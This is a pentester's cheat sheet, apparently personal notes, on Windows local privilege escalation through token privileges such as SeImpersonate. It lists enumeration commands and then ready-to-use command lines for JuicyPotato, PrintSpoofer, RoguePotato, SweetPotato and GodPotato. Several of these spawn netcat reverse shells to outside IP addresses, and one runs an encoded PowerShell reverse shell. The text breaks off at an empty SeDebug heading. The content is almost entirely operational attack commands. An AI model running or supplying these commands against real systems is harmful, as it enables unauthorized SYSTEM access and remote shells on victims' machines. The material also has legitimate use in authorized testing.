---
tags:
  - Local
  - Privilege-Escalation
  - SeAssignPrimaryPrivilege
  - SeBackupPrivilege
  - SeCreateTokenPrivilege
  - SeDebugPrivilege
  - SeImpersonatePrivilege
  - SeLoadDriverPrivilege
  - SeRestorePrivilege
  - SeTakeOwnershipPrivilege
  - SeTcbPrivilege
  - AD
---
## identify
---
```batch
whoami /priv
```
Or sysinternals

[https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
```powershell
accesschk.exe -p
```

## Exploit
---
#### SeImpersonate & SeAssignPrimaryToken
Windows Server 2016 and under: 
**JuicyPotato** [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
```cmd
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.119 5555 -e cmd.exe" -t *
```
Windows Server 2019 and on:
**PrintSpoofer**: [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
Spawn shell over new process *need stable shell*
```cmd
PrintSpoofer.exe -i -c cmd.exe
```
Spawn revshell
```cmd
PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
**RoguePotato:** [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
```
RoguePotato.exe -r <IP> -e "C:\Windows\Tasks\nc.exe <IP> <port> -e cmd.exe" -l 9999
```
**SweetPotato**: [https://github.com/CCob/SweetPotato](https://github.com/CCob/SweetPotato)
```cmd
SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <ENCODED REVSHELL>"
```
OR
```cmd
SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
```
**GodPotato**: [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
```cmd
GodPotato.exe -cmd "cmd /c whoami"
```
```cmd
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

#### SeDebug
